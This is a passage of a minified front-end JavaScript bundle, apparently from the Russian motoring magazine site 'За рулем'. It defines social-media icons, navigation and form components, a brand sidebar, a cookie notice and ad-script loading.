DI0LjExNDEgMTQuNDIyMSAyNC4xMTQxIDEzLjY5NTdDMjQuMTE0MSAxMi45NjkyIDIzLjgyNTUgMTIuMjcyNSAyMy4zMTE5IDExLjc1ODhDMjIuNzk4MiAxMS4yNDUxIDIyLjEwMTUgMTAuOTU2NSAyMS4zNzUgMTAuOTU2NVpNMTUuODAwNCAyMi4zNzMxQzE2LjEwNTUgMjIuMzY0NyAxNi40MjEzIDIyLjQzMjMgMTYuNzIyNCAyMi41OTA3QzE4LjExMjEgMjMuMzIzIDE5LjY5NDEgMjMuNzM5MSAyMS4zNzUgMjMuNzM5MUMyMy4wNTU5IDIzLjczOTEgMjQuNjM3OSAyMy4zMjMgMjYuMDI3NiAyMi41OTA3QzI3LjIzMTkgMjEuOTU3IDI4LjY3OTMgMjIuNzcxIDI4LjY3OTMgMjQuMTMxNUMyOC42NzkzIDI0Ljg2MjggMjguMjcyOCAyNS41MzY5IDI3LjYyMzYgMjUuODcxOUMyNi44NjAzIDI2LjI2NTUgMjYuMDQ2MyAyNi41NzA2IDI1LjIwOTEgMjYuODE3MUwyOC4xNDQ0IDI5Ljc1MjRDMjguODU3NCAzMC40NjU1IDI4Ljg1NzQgMzEuNjIxNSAyOC4xNDQ0IDMyLjMzNDZDMjcuNzg4MyAzMi42OTE2IDI3LjMyMDcgMzIuODY5NiAyNi44NTMzIDMyLjg2OTZDMjYuMzg1OCAzMi44Njk2IDI1LjkxODIgMzIuNjkxNiAyNS41NjIyIDMyLjMzNDZMMjEuMzc1IDI4LjE0NzRMMTcuMTg3OCAzMi4zMzQ2QzE2LjQ3NTcgMzMuMDQ3NyAxNS4zMTc4IDMzLjA0NzcgMTQuNjA1NiAzMi4zMzQ2QzEzLjg5MjYgMzEuNjIxNSAxMy44OTI2IDMwLjQ2NTUgMTQuNjA1NiAyOS43NTI0TDE3LjU0MDkgMjYuODE3MUMxNi43MDM3IDI2LjU3MDYgMTUuODg5NyAyNi4yNjcyIDE1LjEyNjQgMjUuODczN0MxNC40NzcyIDI1LjUzNzcgMTQuMDcwNyAyNC44NjI4IDE0LjA3MDcgMjQuMTMxNUMxNC4wNzA3IDIzLjExMTEgMTQuODg1NCAyMi4zOTg0IDE1LjgwMDQgMjIuMzczMVoiIGZpbGw9IiMzRDQ4NEEiLz4KPC9zdmc+Cg=="),
              href: "https://ok.ru/zrmag/",
              alt: "За рулем в Одноклассниках"
            },
            viber: {
              icon: "".concat(Le.Z),
              darkicon: "".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDIiIGhlaWdodD0iNDIiIHZpZXdCb3g9IjAgMCA0MiA0MiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTI1LjU0NzcgMjguNDAyNUMyNi4yNTQ3IDI4LjExMjUgMjYuODU2IDI3LjY2NTQgMjcuMjU3NCAyNy4wMTlDMjcuODA3MiAyNi4xMzQ1IDI3LjgxNDYgMjUuNTIwNiAyNi45MTM3IDI0Ljg2NjlDMjYuNjgwOSAyNC42OTkyIDI2LjQ0OTkgMjQuNTI5MyAyNi4yMTkgMjQuMzU5NUMyNS44NjA4IDI0LjA5NiAyNS41MDI3IDIzLjgzMjUgMjUuMTM3OCAyMy41Nzc2QzI0LjIyNDcgMjIuOTM4NCAyMy4yMzY3IDIyLjgyNzIgMjIuNTU0MyAyMy45NDczQzIyLjUyNzMgMjMuOTkxIDIyLjQ4OSAyNC4wMjk0IDIyLjQ1MTIgMjQuMDY3M0MyMi40NDA4IDI0LjA3NzcgMjIuNDMwNSAyNC4wODggMjIuNDIwNSAyNC4wOTg0QzIyLjA3MiAyNC40NjIxIDIxLjY0MjQgMjQuNTUzOSAyMS4xODcxIDI0LjM2OTFDMTkuNDU3OCAyMy42NjgyIDE4LjEyMTIgMjIuNTM4NCAxNy4zMTYxIDIwLjg1NTJDMTYuODQzNiAxOS44NjU1IDE2Ljk3MzcgMTkuMzY4OSAxNy44NjExIDE4LjcxMTVDMTcuOTQ4MiAxOC42NDc1IDE4LjAzMjkgMTguNTc5OCAxOC4xMTI3IDE4LjUwNzNDMTguNTAxNyAxOC4xNTgxIDE4LjYwNDggMTcuNzQyNCAxOC4zNzY1IDE3LjI3MjRDMTcuODU0OSAxNi4yMDE4IDE3LjE2MTUgMTUuMjQ3MiAxNi4yODUyIDE0LjQyMzFDMTUuOTY4NSAxNC4xMjQ2IDE1LjU5MDUgMTMuOTc2IDE1LjE2MzQgMTQuMDY5QzE0LjA0NjYgMTQuMzEwNyAxMi45NDA4IDE1LjEwOTQgMTIuOTA4OCAxNi41MjkyQzEyLjkxOTcgMTYuNTkzNSAxMi45MjYzIDE2LjY1OTQgMTIuOTMyOSAxNi43MjUyQzEyLjk0NjYgMTYuODYxIDEyLjk2MDMgMTYuOTk2OCAxMy4wMTA3IDE3LjExODlDMTMuMTAzMyAxNy4zNDIxIDEzLjE5MjkgMTcuNTY3IDEzLjI4MjUgMTcuNzkxOUMxMy41NDU3IDE4LjQ1MjUgMTMuODA5MSAxOS4xMTM2IDE0LjE0OTcgMTkuNzMzOEMxNi4zNjYyIDIzLjc2ODUgMTkuNzE4IDI2LjU3NjcgMjMuOTkzOSAyOC4zNTc4QzI0LjUwMzMgMjguNTcwNSAyNS4wMzEgMjguNjE1MiAyNS41NDc3IDI4LjQwMjVaIiBmaWxsPSIjM0Q0ODRBIi8+CjxwYXRoIGQ9Ik0yMS40NDExIDE1LjQ3OEMyMS42NjcgMTUuNDQwNSAyMS44OTc3IDE1LjQyMjQgMjIuMTI3MiAxNS40MjI0QzI0LjM5MTYgMTUuNDIyNCAyNi4yMzM4IDE3LjIzNjEgMjYuMjMzOCAxOS40NjY3QzI2LjIzMzggMTkuNjkzOSAyNi4yMTU0IDE5LjkyMTEgMjYuMTc3MyAyMC4xNDFDMjYuMTEzNSAyMC41MTY4IDI2LjM3MTIgMjAuODcyMSAyNi43NTI5IDIwLjkzNjFDMjYuNzkyMiAyMC45NDM0IDI2LjgzMTUgMjAuOTQ1OCAyNi44Njk1IDIwLjk0NThDMjcuMjA1OCAyMC45NDU4IDI3LjUwMjggMjAuNzA2NSAyNy41NjA1IDIwLjM2OTRDMjcuNjEwOCAyMC4wNzMzIDI3LjYzNjYgMTkuNzY4OCAyNy42MzY2IDE5LjQ2NTVDMjcuNjM2NiAxNi40NzQ5IDI1LjE2NDggMTQuMDQxMiAyMi4xMjcyIDE0LjA0MTJDMjEuODIwNCAxNC4wNDEyIDIxLjUxMTEgMTQuMDY2NiAyMS4yMTA0IDE0LjExNDlDMjAuODI3NSAxNC4xNzc4IDIwLjU2OTcgMTQuNTM0MiAyMC42MzM2IDE0LjkxQzIwLjY5NzQgMTUuMjg3IDIxLjA1ODIgMTUuNTQyIDIxLjQ0MTEgMTUuNDc4WiIgZmlsbD0iIzNENDg0QSIvPgo8cGF0aCBkPSJNMjQuNDgxMiAyMC42MDAyQzI0Ljg2NzggMjAuNjAwMiAyNS4xODIgMjAuMjkwOCAyNS4xODIgMTkuOTEwMkMyNS4xODIgMTguMDA3MSAyMy42MDg2IDE2LjQ1NzkgMjEuNjc2OCAxNi40NTkyQzIxLjI5MDIgMTYuNDU5MiAyMC45NzYgMTYuNzY4NSAyMC45NzYgMTcuMTQ5MUMyMC45NzYgMTcuNTI5OCAyMS4yOTAyIDE3LjgzOTEgMjEuNjc2OCAxNy44MzkxQzIyLjgzNjYgMTcuODM5MSAyMy43ODA0IDE4Ljc2ODMgMjMuNzgwNCAxOS45MTAyQzIzLjc4MDQgMjAuMjkwOCAyNC4wOTQ2IDIwLjYwMDIgMjQuNDgxMiAyMC42MDAyWiIgZmlsbD0iIzNENDg0QSIvPgo8cGF0aCBkPSJNMjkuMjE4NiAyMS4yOTAyQzI5LjU0MDIgMjEuMjkwMiAyOS44Mjg2IDIxLjA3MzkgMjkuOTAyMiAyMC43NTI0QzMwLjAyNzQgMjAuMjEyMyAzMC4wOTEyIDE5LjY1NCAzMC4wOTEyIDE5LjA5MzRDMzAuMDkxMiAxNC45NzUzIDI2LjY4NzkgMTEuNjI0NSAyMi41MDUyIDExLjYyNDVDMjEuOTM1NyAxMS42MjQ1IDIxLjM2ODcgMTEuNjg2MSAyMC44MTg5IDExLjgxMDZDMjAuNDQwOSAxMS44OTQgMjAuMjA0IDEyLjI2MzcgMjAuMjg5OSAxMi42MzU5QzIwLjM3NDYgMTMuMDA4MSAyMC43NTI2IDEzLjI0MjUgMjEuMTI4MiAxMy4xNTY3QzIxLjU3NjEgMTMuMDU2NCAyMi4wMzc2IDEzLjAwNTcgMjIuNTAyOCAxMy4wMDU3QzI1LjkxMzUgMTMuMDA1NyAyOC42ODcyIDE1LjczNzggMjguNjg3MiAxOS4wOTQ2QzI4LjY4NzIgMTkuNTUxMyAyOC42MzU2IDIwLjAwNjkgMjguNTMzOCAyMC40NDc5QzI4LjQ0NzkgMjAuODE4OSAyOC42ODQ3IDIxLjE4ODcgMjkuMDYyNyAyMS4yNzMyQzI5LjExNDMgMjEuMjg0MSAyOS4xNjcxIDIxLjI5MDIgMjkuMjE4NiAyMS4yOTAyWiIgZmlsbD0iIzNENDg0QSIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTIxIDQyQzMyLjU5OCA0MiA0MiAzMi41OTggNDIgMjFDNDIgOS40MDIwMiAzMi41OTggMCAyMSAwQzkuNDAyMDIgMCAwIDkuNDAyMDIgMCAyMUMwIDMyLjU5OCA5LjQwMjAyIDQyIDIxIDQyWk0zMS4yNjU4IDEwLjI4MkMzMi43MjI2IDExLjI2OTMgMzMuNzE1NSAxMi42NjQ5IDM0LjIxNzUgMTQuNDI3OUMzNC45NTUxIDE3LjAyNDcgMzUuMTY4NiAxOS44OTU3IDM0Ljg2OTIgMjMuMjA0MkMzNC42OTg2IDI1LjA4NTYgMzQuMjQyIDI2Ljc0NTkgMzMuNDc0OSAyOC4yNzgxQzMyLjczOTggMjkuNzQ2MiAzMS41MTQ5IDMwLjg0MSAyOS44MzcyIDMxLjUzMUMyOC4wMDM2IDMyLjI4MzggMjYuMDU3MSAzMi40NDMzIDI0LjM3NjkgMzIuNTMzOUMyMi45OSAzMi42MDc2IDIxLjU5NDUgMzIuNjU5NiAyMC4yMjg1IDMyLjY4NjJDMjAuMTUzNSAzMi42ODc3IDIwLjEwOTkgMzIuNjg4NiAyMC4wNzE3IDMyLjcwMzVDMjAuMDE4OCAzMi43MjQxIDE5Ljk3NjQgMzIuNzcxOCAxOS44NzUxIDMyLjg4NTVMMTUuODc3NyAzNi43MTM2QzE1LjY4NjMgMzYuODk3MyAxNS40Mjk3IDM3IDE1LjE2MjIgMzdDMTQuNTk1MiAzNyAxNC4xMzYyIDM2LjU0ODEgMTQuMTM2MiAzNS45ODk4VjMxLjcyNDNDMTMuOTIzOCAzMS42MzI1IDEzLjY4MDggMzEuNTQ1NSAxMy40MjggMzEuNDU3M0MxMi45MjIzIDMxLjI4MDggMTIuNDAyIDMxLjA5ODQgMTEuOTkzMyAzMC44NDU4QzEwLjM5MjkgMjkuODU1IDkuMzE1MjcgMjguMzQ1OCA4LjY5OTE2IDI2LjIzNDhDOC4wNjU4NiAyNC4wNjk0IDcuODY1ODEgMjEuNzMyNCA4LjA4NjczIDE5LjA5MjJDOC4xODI0NiAxNy45NTAzIDguMzQ2OTIgMTYuNzUyOCA4LjU5MjM4IDE1LjQyODRDOS4wOTY4MSAxMi43IDEwLjc0ODggMTAuNjg0NCAxMy41MDE2IDkuNDM5ODFDMTQuOTA2OSA4LjgwNDIxIDE2LjQ0NiA4LjQxMDI5IDE4LjQ5MDcgOC4xNjM3OUMyMC42NzA0IDcuOTAxNTcgMjIuOTU5MyA3Ljk1MzUzIDI1LjQ4NjQgOC4zMjQ1QzI3LjMxMjYgOC41OTI3NSAyOS40MjczIDkuMDM1MDEgMzEuMjY1OCAxMC4yODJaIiBmaWxsPSIjM0Q0ODRBIi8+Cjwvc3ZnPgo="),
              href: "https://invite.viber.com/?g2=AQB0H00UpI9O6E6l%2By%2BMvkML4J34GsK%2FkeuYFUEIdjSIFeRcqlu3L3gaXu1%2BkUUo&lang=ru",
              alt: "За рулем в Вайбер"
            }
          },
          Ae = ["network", "width", "height", "dark"];
        function be(e) {
          var t = e.network,
            i = e.width,
            n = e.height,
            r = e.dark,
            l = a()(e, Ae);
          return o.createElement(xe, l, t.map(function (e) {
            return o.createElement(De, {
              key: Ee[e].href,
              href: Ee[e].href,
              target: "_blank"
            }, o.createElement(D.Z, {
              noFormatUrl: !0,
              url: r && Ee[e].darkicon ? Ee[e].darkicon : Ee[e].icon,
              width: i,
              height: n,
              altText: Ee[e].alt
            }));
          }));
        }
        var ve = l.ZP.nav.withConfig({
            displayName: "styled__SubNav",
            componentId: "sc-n4ur6-0"
          })(["font-size:15px;line-height:1.4em;display:flex;align-items:center;margin:0 0 3rem 0;flex-flow:row wrap;@media (max-width:1024px){padding:0;margin:0 0 3rem 0;display:grid;grid-template-columns:50% 50%;}"]),
          Oe = l.ZP.span.withConfig({
            displayName: "styled__LinkCount",
            componentId: "sc-n4ur6-1"
          })(["color:#939893;"]),
          ke = l.ZP.div.withConfig({
            displayName: "styled__SubNavItem",
            componentId: "sc-n4ur6-2"
          })(["padding:3px 13px;margin-left:0;margin-bottom:8px;text-align:center;", " ", ""], (0, L.fq)("$isActive", (0, l.iv)(["background:linear-gradient(to bottom,#960015 0,#b9021c 52%,#f65720 100%);box-shadow:inset 3px 2px 13px rgb(67 0 0 / 34%);border-radius:20px;a span{color:#fff;border-bottom:none;border-bottom-color:transparent;text-shadow:0 1px 0 rgb(130 15 15 / 61%);}", "{opacity:0.5;color:#fff;text-shadow:0 1px 0 rgb(130 15 15 / 61%);}"], Oe)), (0, L.fq)("$isHidden", (0, l.iv)(["display:none;"]))),
          Ce = (0, l.ZP)(n.Z).withConfig({
            displayName: "styled__SubNavLink",
            componentId: "sc-n4ur6-3"
          })(["cursor:pointer;text-decoration:none;margin-right:5px;&:hover{border-color:transparent;}span{color:#4e4e4e;border-bottom:1px solid rgba(78,78,78,0.3);}"]),
          Se = l.ZP.nav.withConfig({
            displayName: "styled__SubNavGray",
            componentId: "sc-n4ur6-4"
          })(["font-size:15px;line-height:21px;display:flex;align-items:center;margin:0 0 33px 0;flex-flow:row;background:#e0e0e0;@media (max-width:1024px){justify-content:space-between;}"]),
          Ze = l.ZP.div.withConfig({
            displayName: "styled__SubNavItemGray",
            componentId: "sc-n4ur6-5"
          })(["padding:6px 16px 8px 16px;margin-right:19px;font-weight:700;text-align:center;@media (max-width:1024px){padding:6px 7px 8px 7px;margin-right:0;}@media (max-width:768px){padding:6px 6px 8px 6px;}", ""], (0, L.fq)("$isActive", (0, l.iv)(["background:#d90000;box-shadow:inset 3px 2px 13px rgba(67,0,0,0.34);a span{color:#fff;border-bottom:none;border-bottom-color:transparent;}a h2{color:#fff;font-size:15px;padding:0;margin:0;line-height:21px;}"]))),
          Qe = (0, l.ZP)(n.Z).withConfig({
            displayName: "styled__SubNavLinkGray",
            componentId: "sc-n4ur6-6"
          })(["cursor:pointer;text-decoration:none;color:#000;&:hover{border-color:transparent;}"]);
        function Pe(e) {
          var t = e.urls,
            i = e.path;
          return e.gray ? o.createElement(Se, null, t.map(function (e) {
            var t = e.name,
              n = e.href,
              r = e.selected,
              a = e.count,
              l = !(!a || 0 != a),
              c = i ? i === n : r;
            return o.createElement(Ze, {
              $isActive: c,
              $isHidden: l,
              key: n
            }, o.createElement(Qe, {
              href: n
            }, c ? o.createElement("h2", null, t) : o.createElement("span", null, t)));
          })) : o.createElement(ve, null, t.map(function (e) {
            var t = e.name,
              n = e.href,
              r = e.selected,
              a = e.count,
              l = !(!a || 0 != a),
              c = i ? i === n : r;
            return o.createElement(ke, {
              $isActive: c,
              $isHidden: l,
              key: n
            }, o.createElement(Ce, {
              href: n
            }, o.createElement("span", null, t)), a && a > 0 && o.createElement(Oe, null, a));
          }));
        }
        var Ue = i(9801),
          Ye = i(7154),
          _e = i.n(Ye),
          We = l.ZP.div.withConfig({
            displayName: "styled__FieldContainer",
            componentId: "sc-67pgoq-0"
          })(["position:relative;margin-bottom:9px;width:100%;display:inline-block;width:", ";"], function (e) {
            return e.$width ? "".concat(e.$width, "px") : "100%";
          }),
          Ge = l.ZP.span.withConfig({
            displayName: "styled__FieldLabel",
            componentId: "sc-67pgoq-1"
          })(["font-size:15px;line-height:18px;margin-top:8px;width:100%;"]),
          Re = l.ZP.span.withConfig({
            displayName: "styled__InputContainer",
            componentId: "sc-67pgoq-2"
          })(["display:inline-block;margin-bottom:4px;width:100%;"]),
          He = l.ZP.input.withConfig({
            displayName: "styled__FieldInput",
            componentId: "sc-67pgoq-3"
          })(["width:100%;outline:0;margin:0;padding:12px 15px;border:1px solid #ababab;border-radius:4px;box-shadow:inset 0 1px 4px rgb(0 0 0 / 20%);font-size:14px;line-height:18px;color:#4e4e4e;height:", ";"], function (e) {
            return e.$height ? "".concat(e.$height, "px") : "auto";
          }),
          Be = l.ZP.div.withConfig({
            displayName: "styled__ErrorContainer",
            componentId: "sc-67pgoq-4"
          })(["margin-left:0;text-align:left;margin-top:5px;"]),
          Fe = l.ZP.span.withConfig({
            displayName: "styled__Error",
            componentId: "sc-67pgoq-5"
          })(["color:#fff;font-size:11px;background-color:#d90022;padding:3px 6px;margin-right:5px;border-radius:3px;white-space:nowrap;"]),
          Je = l.ZP.textarea.withConfig({
            displayName: "styled__FieldTextArea",
            componentId: "sc-67pgoq-6"
          })(["width:100%;outline:0;margin:0;padding:12px 15px;border:1px solid #ababab;border-radius:4px;box-shadow:inset 0 1px 4px rgb(0 0 0 / 20%);font-size:14px;font-family:Arial,Helvetica,sans-serif;line-height:18px;color:#4e4e4e;resize:none;min-height:52px;height:", ";"], function (e) {
            return e.$height ? "".concat(e.$height, "px") : "auto";
          }),
          Ve = l.ZP.label.withConfig({
            displayName: "styled__CheckboxLabel",
            componentId: "sc-67pgoq-7"
          })(['color:#1c88d4;font-family:"PT Sans",Arial,sans-serif;text-decoration:underline;line-height:18px;cursor:pointer;display:inline-block;padding-left:23px;position:relative;vertical-align:middle;white-space:nowrap;font-size:', ";color:", ";"], function (e) {
            return e.$fontSize ? "".concat(e.$fontSize, "px") : "inherit";
          }, function (e) {
            return e.$color ? e.$color : "inherit";
          }),
          $e = l.ZP.span.withConfig({
            displayName: "styled__CheckboxIndicator",
            componentId: "sc-67pgoq-8"
          })(["left:7px;top:3px;width:11px;height:11px;background-color:#f4f4f4;background-position:center center;background-repeat:no-repeat;background-size:90% 90%;border:1px solid #b6b6b6;border-radius:4px;box-shadow:inset 0 0.125rem 0.125rem rgb(0 0 0 / 10%);color:#eee;display:block;font-size:65%;position:absolute;text-align:center;user-select:none;&:before{left:1px;top:1px;width:9px;height:9px;border-radius:3px;content:'';display:block;position:absolute;}}"]),
          qe = l.ZP.input.withConfig({
            displayName: "styled__CheckboxInput",
            componentId: "sc-67pgoq-9"
          })(["display:none;&:checked ~{", "{box-shadow:none;&:before{background-color:#8397a9;}}}"], $e),
          Xe = ["label", "name", "onChange", "onChangeTextArea", "type", "require", "error", "textarea", "height", "value", "placeholder", "checkbox", "width", "checked", "color", "fontSize"];
        function Ke(e) {
          var t = e.label,
            i = e.name,
            n = e.onChange,
            r = e.onChangeTextArea,
            l = e.type,
            c = void 0 === l ? "text" : l,
            s = e.require,
            M = e.error,
            d = e.textarea,
            g = e.height,
            u = e.value,
            m = e.placeholder,
            p = e.checkbox,
            y = e.width,
            I = e.checked,
            N = e.color,
            j = e.fontSize,
            h = a()(e, Xe);
          return p ? o.createElement(We, _e()({
            $width: y
          }, h), o.createElement(Ve, {
            $color: N,
            $fontSize: j
          }, o.createElement(qe, _e()({
            type: "checkbox",
            checked: I,
            name: i,
            required: !!s || void 0
          }, h, {
            onChange: n,
            value: u
          })), o.createElement($e, null), t)) : o.createElement(We, {
            $width: y
          }, o.createElement(Ge, null, t), o.createElement(Re, null, !d && o.createElement(He, _e()({
            type: c,
            name: i,
            $height: g,
            required: !!s || void 0
          }, h, {
            onChange: n,
            value: u,
            placeholder: m
          })), d && o.createElement(Je, _e()({
            name: i,
            $height: g,
            required: !!s || void 0
          }, h, {
            value: u,
            onChange: r
          }), u), M && o.createElement(Be, null, o.createElement(Fe, null, M))));
        }
        var et = (0, l.ZP)(D.Z).withConfig({
            displayName: "styled__Avatar",
            componentId: "sc-1khck4t-0"
          })(["margin-right:25px;object-fit:cover;border-radius:50%;width:60px;height:60px;"]),
          tt = l.ZP.span.withConfig({
            displayName: "styled__UserName",
            componentId: "sc-1khck4t-1"
          })(["color:#723b86;text-decoration:none;border-bottom:0.0625rem solid transparent;"]),
          it = l.ZP.div.withConfig({
            displayName: "styled__UserInfo",
            componentId: "sc-1khck4t-2"
          })(["display:flex;flex-flow:column;align-items:flex-start;justify-content:flex-start;"]),
          nt = l.ZP.span.withConfig({
            displayName: "styled__UserDate",
            componentId: "sc-1khck4t-3"
          })(["color:#ababab;font-size:1.1rem;letter-spacing:0.1rem;text-transform:uppercase;padding:0 3.375rem 0 4rem;@media (max-width:1024px){padding:5px 0;}"]),
          rt = (0, l.ZP)(n.Z).withConfig({
            displayName: "styled__UserBlock",
            componentId: "sc-1khck4t-4"
          })(["font-size:15px;display:flex;text-decoration:none;transition:0.3s;&:hover{", "{border-color:#723b86;}}margin-bottom:20px;"], tt);
        function at(e) {
          var t = e.user,
            i = t.name,
            n = t.avatar,
            r = t.sex,
            a = t.dateCreated,
            l = t.href;
          return o.createElement(rt, {
            href: l || ""
          }, n ? o.createElement(et, {
            picture: n,
            size: 60
          }) : o.createElement(o.Fragment, null, r && 2 == r.id ? o.createElement(et, {
            url: h
          }) : o.createElement(et, {
            url: x
          })), o.createElement(it, null, o.createElement(tt, null, i), o.createElement(nt, null, "На сайте с  ", a && o.createElement(u.Z, {
            date: a,
            dateNumber: !0
          }))));
        }
        var ot = i(6233);
        function lt() {
          return o.createElement(o.Fragment, null, o.createElement(oe.q, null, o.createElement("script", {
            async: !0,
            src: "https://cdn.afp.ai/ssp/sdk.js"
          }), o.createElement("script", {
            async: !0,
            src: "https://cdn.afp.ai/ssp/sdk_review.js"
          })));
        }
      },
      5833: (e, t, i) => {
        i.d(t, {
          Z: () => b
        });
        var n = i(3038),
          r = i.n(n),
          a = i(7294),
          o = i(9163),
          l = i(8655),
          c = i(8526),
          s = i(5040),
          M = (0, o.F4)(["0%{background-position:-100px}40%,100%{background-position:140px}"]),
          d = o.ZP.div.withConfig({
            displayName: "styled__MainSection",
            componentId: "sc-10px4wa-0"
          })(['position:relative;width:100%;min-height:720px;box-sizing:border-box;display:flex;padding:1.8125rem 0.375rem 2rem;div[data-slot-name="3"]{min-height:1px;div{width:100%;height:100%;}}@media (max-width:1024px){padding:0;max-width:512px;margin:0 auto;min-height:unset;}']),
          g = o.ZP.div.withConfig({
            displayName: "styled__PageContainer",
            componentId: "sc-10px4wa-1"
          })(["width:100%;overflow-anchor:none;", " ", " @media (max-width:1365px){margin-left:16px;}@media (max-width:1024px){margin-left:0px;padding:1rem 12px;box-sizing:border-box;", "}", ""], (0, l.fq)("$disableOverflowAnchor", (0, o.iv)(["overflow-anchor:none;"])), (0, l.fq)("$isLoading", (0, o.iv)(["min-height:700px;background:#eee;"])), (0, l.fq)("$oneCol", (0, o.iv)(["margin-right:0;"])), (0, l.fq)("$oneCol", (0, o.iv)(["margin-right:330px;"]))),
          u = (o.ZP.div.withConfig({
            displayName: "styled__PageInner",
            componentId: "sc-10px4wa-2"
          })([""]), o.ZP.div.withConfig({
            displayName: "styled__BrandsWrap",
            componentId: "sc-10px4wa-3"
          })(["", " ", ""], (0, l.fq)("$isSticky", (0, o.iv)(["position:sticky;top:138px;z-index:9;"])), (0, l.fq)("$notShow", (0, o.iv)(["display:none;"])))),
          m = o.ZP.div.withConfig({
            displayName: "styled__BrandsItem",
            componentId: "sc-10px4wa-4"
          })(["&:not(:last-child){margin-bottom:0.375rem;}"]),
          p = o.ZP.span.withConfig({
            displayName: "styled__BrandTitle",
            componentId: "sc-10px4wa-5"
          })([""]),
          y = (0, o.ZP)(c.rH).withConfig({
            displayName: "styled__BrandsLink",
            componentId: "sc-10px4wa-6"
          })(["", ""], (0, l.fq)("$isLoading", (0, o.iv)(["background-image:linear-gradient(90deg,#eee 0px,#e8e8e8 40px,#eee 80px);background-size:600px;border-radius:4px;animation:", " 1.6s infinite linear;", "{visibility:hidden;}"], M, p))),
          I = o.ZP.aside.withConfig({
            displayName: "styled__Brands",
            componentId: "sc-10px4wa-7"
          })(["width:5rem;flex-shrink:0;font-size:0.8125rem;", " @media (max-width:1365px){display:none;}"], (0, l.fq)("$carsSidebar", (0, o.iv)(["margin-left:-11px;", "{padding:0 5px;}"], m))),
          N = (o.ZP.div.withConfig({
            displayName: "styled__BrandsSkeleton",
            componentId: "sc-10px4wa-8"
          })([""]), o.ZP.div.withConfig({
            displayName: "styled__CookieDisclaimerContainer",
            componentId: "sc-10px4wa-9"
          })(["position:fixed;bottom:0;left:0;z-index:200;background-color:#e1e1e1;width:1100px;padding:10px 130px 10px 100px;border:none;margin-bottom:0;box-sizing:border-box;font-size:14px;@media (max-width:1365px){width:100%;max-width:1030px;}@media (max-width:1024px){padding:10px 35px 10px 10px;}"])),
          j = o.ZP.button.withConfig({
            displayName: "styled__CookieDisclaimerClose",
            componentId: "sc-10px4wa-10"
          })(["display:block;position:absolute;right:30px;padding:0;cursor:pointer;background:0 0;border:0;background:url(", ") 0 0 no-repeat;background-size:contain;width:20px;height:20px;@media (max-width:1024px){right:10px;}"], s.Z),
          h = o.ZP.div.withConfig({
            displayName: "styled__CookieDisclaimer",
            componentId: "sc-10px4wa-11"
          })(["display:block;"]),
          x = o.ZP.div.withConfig({
            displayName: "styled__MarketPlace",
            componentId: "sc-10px4wa-12"
          })(["margin:0 auto;padding-top:2rem;height:112px;max-width:682px;"]),
          D = i(4751),
          f = i(2873);
        function w(e) {
          var t = e.isSticky,
            i = e.notShow,
            n = e.cars,
            r = e.isLoading,
            o = (0, D.v9)(f.gg);
          return n ? a.createElement(I, {
            $carsSidebar: !0
          }, a.createElement(u, {
            $isSticky: t,
            $notShow: i
          }, n.map(function (e) {
            var t = e.url,
              i = e.name,
              n = e.id;
            return a.createElement(m, {
              key: n
            }, a.createElement(y, {
              $isLoading: r,
              href: "/park-zr/".concat(t),
              key: n,
              color: "#000"
            }, a.createElement(p, null, i)));
          }), a.createElement(c.rH, {
            color: "#0094f6",
            href: "/park-zr/"
          }, "Весь парк"))) : a.createElement(I, null, a.createElement(u, {
            $isSticky: t,
            $notShow: i
          }, o.map(function (e) {
            var t = e.href,
              i = e.name,
              n = e.id;
            return a.createElement(m, {
              key: n
            }, a.createElement(y, {
              $isLoading: r,
              href: t,
              key: n,
              color: "#000"
            }, a.createElement(p, null, i)));
          }), a.createElement(c.rH, {
            color: "#0094f6",
            href: "/cars/"
          }, "Все марки")));
        }
        var z = i(5167),
          T = i(236);
        function L() {
          var e = (0, a.useState)(!0),
            t = r()(e, 2),
            i = t[0],
            n = t[1];
          return i ? a.createElement(N, null, a.createElement(j, {
            onClick: function () {
              return n(!1);
            }
          }), a.createElement(h, null, "Продолжая использовать наш сайт, вы даете согласие на обработку файлов ", a.createElement(c.rH, {
            color: "#0094f6",
            href: "/legal-privacy-issues/"
          }, "cookie"), ", в целях функционирования сайта.")) : null;
        }
        var E = i(6258),
          A = i(6804);
        function b(e) {
          var t = e.children,
            i = e.withAside,
            n = e.isLoading,
            o = e.disableOverflowAnchor,
            l = e.isSticky,
            c = e.sidebarTop,
            s = e.notShow,
            M = e.oneCol,
            u = e.cars,
            m = e.shortVer,
            p = void 0 !== m && m,
            y = (0, a.useState)(!1),
            I = r()(y, 2),
            N = I[0],
            j = I[1],
            h = (0, a.useRef)(null),
            D = (0, a.useState)(0),
            f = r()(D, 2),
            b = f[0],
            v = f[1],
            O = (0, T.sB)();
          return (0, a.useEffect)(function () {
            "1" !== E.Z.get("cookieDiscl") && (j(!0), E.Z.set("cookieDiscl", "1", {
              expires: 365
            })), h.current && v(h.current.clientHeight);
          }, [b]), a.createElement(a.Fragment, null, a.createElement(d, {
            ref: h
          }, a.createElement(w, {
            isLoading: n,
            isSticky: l,
            notShow: s,
            cars: u
          }), a.createElement(g, {
            $isLoading: n,
            $oneCol: M,
            $disableOverflowAnchor: o
          }, n ? null : a.createElement(a.Fragment, null, t, " ", a.createElement(x, null, a.createElement(A.Wr, {
            slot: "106",
            isVisible: [!0, !0]
          })))), i && a.createElement(z.Z, {
            sidebarTop: c,
            pageHeight: b,
            shortVer: p
          }), N && a.createElement(L, null), O && a.createElement(A.Wr, {
            slot: "3"
          })));
        }
      },
      8182: (e, t, i) => {
        i.d(t, {
          Z: () => g
        });
        var n = i(9713),
          r = i.n(n),
          a = i(7294),
          o = i(3989),
          l = i(236),
          c = i(4751),
          s = i(2873),
          M = i(7137);
        function d(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function g(e) {
          var t = e.story,
            i = e.metaTitle,
            n = e.endlessN,
            g = t || {},
            u = g.authors,
            m = g.publishers,
            p = g.rubrics,
            y = g.tags,
            I = g.carModels,
            N = g.date,
            j = (0, o.Fs)(),
            h = j.isMobile,
            x = j.isTablet,
            D = (0, l.ZQ)(),
